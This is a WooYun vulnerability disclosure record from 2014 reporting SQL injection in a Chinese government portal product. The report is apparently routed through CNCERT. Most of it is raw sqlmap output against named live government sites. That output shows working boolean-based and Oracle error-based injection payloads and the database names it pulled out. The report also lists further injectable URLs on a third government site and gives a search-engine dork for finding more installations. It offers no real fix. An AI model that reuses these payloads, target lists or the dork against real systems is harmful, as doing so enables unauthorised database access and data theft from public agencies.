{"id": 54638, "wybug_id": "wooyun-2014-063831", "wybug_title": "某政府系统多处sql注入", "wybug_corp": "某政府系统", "wybug_author": "Mosuan", "wybug_date": "2014-06-09 18:11", "wybug_open_date": "2014-09-07 18:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "黑盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向公众公开  简要描述： 女神在哪里 详细说明：  http://zone.wooyun.org/content/12400应U神and疯狗在帖子中提到的搜索引擎搜索到的数量少的问题目前这个漏洞只能搜到两个正常的站具体的客户量得去问厂商了。1、建站程序类型：政府2、漏洞类型：sql3、缺陷文件：多处4、注入参数：多个参数存在注入5、危害程度：高6、涉及厂商：河南山谷创新网络科技有限公司7、厂商网站：http://www.chinavvv.com/8、安装量：搜索引擎搜到两个9、是否拥有源代码：否10、关键字：inurl:/dwld/dwld.jsp 很多，只例举一个11、枚举案例：\n注入地址:http://shenpi.hengyang.gov.cn/langchao.ecgap.outportal/OnlineQuery/QueryDetail.aspx?QueryId=911    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 23:09:40[23:09:40] [INFO] using 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\shenpi.hengyang.gov.cn\\session' as session file[23:09:40] [INFO] testing connection to the target url[23:09:40] [INFO] testing if the url is stable, wait a few seconds[23:09:42] [INFO] url is stable[23:09:42] [INFO] testing if GET parameter 'QueryId' is dynamic[23:09:42] [INFO] confirming that GET parameter 'QueryId' is dynamic[23:09:42] [WARNING] GET parameter 'QueryId' appears to be not dynamic[23:09:43] [WARNING] heuristic test shows that GET parameter 'QueryId' might not be injectable[23:09:43] [INFO] testing sql injection on GET parameter 'QueryId'[23:09:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[23:09:50] [INFO] GET parameter 'QueryId' is 'AND boolean-based blind - WHERE or HAVING clause' injectable[23:09:50] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[23:09:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[23:09:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[23:09:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[23:09:52] [INFO] testing 'MySQL > 5.0.11 stacked queries'[23:09:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[23:09:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[23:09:58] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[23:10:01] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[23:10:02] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[23:10:07] [INFO] testing 'Oracle AND time-based blind'[23:10:08] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[23:10:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[23:10:17] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using the --dbms option[23:10:21] [INFO] checking if the injection point on GET parameter 'QueryId' isa false positiveGET parameter 'QueryId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 48 HTTP(s) requests:---Place: GETParameter: QueryId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: QueryId=911' AND 9352=9352 AND 'mUaM'='mUaM---[23:11:00] [INFO] testing MySQL[23:11:01] [WARNING] the back-end DBMS is not MySQL[23:11:01] [INFO] testing Oracle[23:11:01] [WARNING] the back-end DBMS is not Oracle[23:11:01] [INFO] testing PostgreSQL[23:11:01] [WARNING] the back-end DBMS is not PostgreSQL[23:11:01] [INFO] testing Microsoft SQL Server[23:11:02] [INFO] confirming Microsoft SQL Server[23:11:04] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[23:11:04] [INFO] fetching database names[23:11:04] [INFO] fetching number of databases[23:11:04] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[23:11:04] [INFO] retrieved: 9[23:11:10] [INFO] retrieved: DataExPre[23:11:49] [INFO] retrieved: DynamicProjectMgtDB[23:13:17] [INFO] retrieved: master[23:13:44] [INFO] retrieved: model[23:14:12] [INFO] retrieved: msdb[23:14:46] [INFO] retrieved: OutPortalDb[23:16:08] [INFO] retrieved: ReportServer[23:17:18] [INFO] retrieved: ReportServerTempDB[23:19:35] [INFO] retrieved: tempdbavailable databases [9]:[*] DataExPre[*] DynamicProjectMgtDB[*] master[*] model[*] msdb[*] OutPortalDb[*] ReportServer[*] ReportServerTempDB[*] tempdb[23:20:54] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 397 times[23:20:54] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\shenpi.hengyang.gov.cn'\n\n注入地址:http://www.suiyangqu.gov.cn/xxgk/zdgz/zdgz.jsp?artid=1207797206250    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 23:28:09[23:28:09] [INFO] using 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.suiyangqu.gov.cn\\session' as session file[23:28:09] [INFO] testing connection to the target url[23:28:10] [INFO] testing if the url is stable, wait a few seconds[23:28:13] [INFO] url is stable[23:28:13] [INFO] testing if GET parameter 'artid' is dynamic[23:28:14] [INFO] confirming that GET parameter 'artid' is dynamic[23:28:15] [INFO] GET parameter 'artid' is dynamic[23:28:16] [INFO] heuristic test shows that GET parameter 'artid' might be injectable (possible DBMS: Oracle)[23:28:16] [INFO] testing sql injection on GET parameter 'artid'[23:28:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[23:28:26] [INFO] GET parameter 'artid' is 'AND boolean-based blind - WHERE or HAVING clause' injectable[23:28:26] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[23:28:27] [INFO] GET parameter 'artid' is 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' injectable[23:28:27] [INFO] testing 'Oracle AND time-based blind'[23:28:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[23:28:29] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for UNION query injection technique[23:28:32] [INFO] target url appears to have 1 columns in query[23:28:33] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. --union-char=1) and/or try to force theback-end DBMS (e.g. --dbms=mysql)GET parameter 'artid' is vulnerable. Do you want to keep testing the others (ifany)? [y/N] ysqlmap identified the following injection points with a total of 20 HTTP(s) requests:---Place: GETParameter: artid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: artid=1207797206250' AND 2911=2911 AND 'zsRX'='zsRX    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: artid=1207797206250' AND 8117=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(104)||CHR(121)||CHR(101)||CHR(58)||(SELECT (CASE WHEN (8117=8117) THEN 1ELSE 0 END) FROM DUAL)||CHR(58)||CHR(102)||CHR(102)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'FPtw'='FPtw---[23:28:59] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[23:28:59] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[23:28:59] [INFO] fetching database (schema) names[23:29:00] [INFO] the SQL query used returns 8 entries[23:29:01] [INFO] retrieved: CTXSYS[23:29:03] [INFO] retrieved: EXFSYS[23:29:04] [INFO] retrieved: MDSYS[23:29:05] [INFO] retrieved: OLAPSYS[23:29:05] [INFO] retrieved: SYS[23:29:09] [INFO] retrieved: SYSTEM[23:29:10] [INFO] retrieved: WMSYS[23:29:11] [INFO] retrieved: XXGKavailable databases [8]:[*] CTXSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] SYS[*] SYSTEM[*] WMSYS[*] XXGK[23:29:11] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 22 times[23:29:11] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.suiyangqu.gov.cn'\n下面再举例别的注入点，\nhttp://www.xiangxian.gov.cn/xxgk/ysqgk/fagaishequgongkai.jsp?gid=1208397066815http://www.xiangxian.gov.cn/xxgk/zdgz/zdgz.jsp?artid=1207797206250http://www.xiangxian.gov.cn/xxgk/search.jsp?gjz=aaahttp://www.xiangxian.gov.cn/xxgk/zhinan/fgwgkwn.jsp?gid=1208397066815http://www.xiangxian.gov.cn/xxgk/info.jsp?idd=1219193506562http://www.xiangxian.gov.cn/xxgk/ldmd/inldmd.jsp?sid=120503091315http://www.xiangxian.gov.cn/xxgk/dwld/jigou.jsp?gid=1208397066815http://www.xiangxian.gov.cn/xxgk/dwld/fen.jsp?ngid=1209956752125http://www.xiangxian.gov.cn/xxgk/dwld/lingdao.jsp?gid=1208397066815\n   漏洞证明：  详细说明   修复方案：  你们懂的   版权声明：转载请注明来源 Mosuan@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-14 09:35 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给河南分中心处置，要求其联系软件生产厂商。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}